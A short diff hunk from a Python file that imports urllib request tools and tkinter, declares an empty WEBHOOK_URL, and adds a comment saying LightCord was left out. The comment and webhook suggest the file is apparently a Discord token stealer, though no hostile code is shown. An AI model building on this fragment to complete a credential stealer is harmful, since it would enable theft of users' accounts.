@@ -10,6 +10,7 @@ from urllib.request import Request, urlopen
 import tkinter
 from tkinter import *
 
+#I didn't added LightCord because it sucks!
 
 WEBHOOK_URL = ''
 
